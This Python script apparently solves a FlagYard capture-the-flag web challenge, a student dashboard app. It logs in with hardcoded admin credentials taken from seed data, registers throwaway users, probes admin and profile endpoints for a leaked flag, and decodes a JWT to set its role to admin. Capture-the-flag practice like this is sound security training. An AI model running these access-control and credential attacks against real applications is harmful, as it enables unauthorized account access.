#!/usr/bin/env python3
"""
FlagYard Challenge Solver Script
Student Dashboard Web Application

This script demonstrates how to solve the challenge by:
1. Registering a new user
2. Attempting to access admin endpoints
3. Finding the flag through various attack vectors

Dependencies:
- requests
- json

Usage:
    python3 solve.py <target_url>
    
Example:
    python3 solve.py http://localhost:5000
"""

import requests
import json
import sys
import time
import random
import string

class ChallengeSolver:
    def __init__(self, base_url):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'FlagYard-Solver/1.0'
        })
        
    def log(self, message):
        print(f"[{time.strftime('%H:%M:%S')}] {message}")
        
    def register_user(self):
        """Register a new user account"""
        email = f"hacker_{''.join(random.choices(string.ascii_lowercase, k=8))}@utwj.local"
        password = "password123"
        
        self.log(f"Registering user: {email}")
        
        response = self.session.post(f"{self.base_url}/api/auth/register", json={
            'email': email,
            'password': password
        })
        
        if response.status_code == 201:
            data = response.json()
            self.log(f"Successfully registered user: {data['user']['email']}")
            return data['token']
        else:
            self.log(f"Registration failed: {response.status_code} - {response.text}")
            return None
            
    def login_user(self, email, password):
        """Login with existing credentials"""
        self.log(f"Logging in as: {email}")
        
        response = self.session.post(f"{self.base_url}/api/auth/login", json={
            'email': email,
            'password': password
        })
        
        if response.status_code == 200:
            data = response.json()
            self.log(f"Successfully logged in as: {data['user']['email']}")
            return data['token']
        else:
            self.log(f"Login failed: {response.status_code} - {response.text}")
            return None
            
    def try_admin_access(self, token):
        """Try to access admin endpoints with the given token"""
        self.session.headers.update({
            'Authorization': f'Bearer {token}'
        })
        
        # Try the admin endpoint
        self.log("Attempting to access admin endpoint...")
        response = self.session.get(f"{self.base_url}/api/admin/")
        
        if response.status_code == 200:
            data = response.json()
            self.log(f"Admin access successful!")
            self.log(f"Response: {json.dumps(data, indent=2)}")
            return data.get('flag')
        else:
            self.log(f"Admin access denied: {response.status_code} - {response.text}")
            return None
            
    def try_me_endpoint(self, token):
        """Try the /me endpoint which might expose admin panel info"""
        self.session.headers.update({
            'Authorization': f'Bearer {token}'
        })
        
        self.log("Attempting to access /me endpoint...")
        response = self.session.get(f"{self.base_url}/api/auth/me")
        
        if response.status_code == 200:
            data = response.json()
            self.log(f"Me endpoint response: {json.dumps(data, indent=2)}")
            
            # Check if admin panel info is exposed
            if 'adminPanel' in data and 'flag' in data['adminPanel']:
                return data['adminPanel']['flag']
        else:
            self.log(f"Me endpoint failed: {response.status_code} - {response.text}")
            
        return None
        
    def try_dashboard_endpoint(self, token):
        """Try the dashboard endpoint which might expose admin panel info"""
        self.session.headers.update({
            'Authorization': f'Bearer {token}'
        })
        
        self.log("Attempting to access dashboard endpoint...")
        response = self.session.get(f"{self.base_url}/api/auth/me/dashboard")
        
        if response.status_code == 200:
            data = response.json()
            self.log(f"Dashboard endpoint response: {json.dumps(data, indent=2)}")
            
            # Check if admin panel info is exposed
            if 'adminPanel' in data and 'flag' in data['adminPanel']:
                return data['adminPanel']['flag']
        else:
            self.log(f"Dashboard endpoint failed: {response.status_code} - {response.text}")
            
        return None
        
    def try_known_admin_credentials(self):
        """Try known admin credentials from seed data"""
        admin_credentials = [
            ('admin@utwj.local', 'admin123_jR1a1nXd%0a222'),
        ]
        
        for email, password in admin_credentials:
            self.log(f"Trying known admin credentials: {email}")
            token = self.login_user(email, password)
            if token:
                return token
                
        return None
        
    def try_jwt_manipulation(self, token):
        """Try various JWT manipulation techniques"""
        self.log("Attempting JWT manipulation...")
        
        # Try to decode and modify the JWT (this is a simplified example)
        try:
            import base64
            
            # Split JWT into parts
            parts = token.split('.')
            if len(parts) != 3:
                self.log("Invalid JWT format")
                return None
                
            # Decode header and payload
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
            
            self.log(f"JWT Header: {header}")
            self.log(f"JWT Payload: {payload}")
            
            # Try to modify role in payload (this won't work without proper signing)
            # This is just for demonstration
            payload['role'] = 'admin'
            
            # Note: In a real attack, you'd need to either:
            # 1. Find a weak secret
            # 2. Use a "none" algorithm
            # 3. Find other vulnerabilities
            
        except Exception as e:
            self.log(f"JWT manipulation failed: {e}")
            
        return None
        
    def solve(self):
        """Main solving logic"""
        self.log("Starting FlagYard Challenge Solver")
        self.log(f"Target URL: {self.base_url}")
        
        # Test if the service is running
        try:
            response = self.session.get(f"{self.base_url}/api/health", timeout=5)
            self.log(f"Service is running (status: {response.status_code})")
        except requests.exceptions.RequestException as e:
            self.log(f"Service is not accessible: {e}")
            return False
            
        # Strategy 1: Try known admin credentials
        self.log("\n=== Strategy 1: Known Admin Credentials ===")
        admin_token = self.try_known_admin_credentials()
        if admin_token:
            flag = self.try_admin_access(admin_token)
            if flag:
                self.log(f"🎉 FLAG FOUND: {flag}")
                return True
                
        # Strategy 2: Register new user and try various endpoints
        self.log("\n=== Strategy 2: New User Registration ===")
        user_token = self.register_user()
        if user_token:
            # Try different endpoints that might expose admin info
            for endpoint_name, endpoint_func in [
                ("/me", self.try_me_endpoint),
                ("/me/dashboard", self.try_dashboard_endpoint),
                ("/admin", self.try_admin_access)
            ]:
                flag = endpoint_func(user_token)
                if flag:
                    self.log(f"🎉 FLAG FOUND via {endpoint_name}: {flag}")
                    return True
                    
        # Strategy 3: JWT manipulation (if applicable)
        if user_token:
            self.log("\n=== Strategy 3: JWT Manipulation ===")
            self.try_jwt_manipulation(user_token)
            
        self.log("\n❌ Could not find the flag")
        return False

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 solve.py <target_url>")
        print("Example: python3 solve.py http://localhost:5000")
        sys.exit(1)
        
    target_url = sys.argv[1]
    solver = ChallengeSolver(target_url)
    
    success = solver.solve()
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
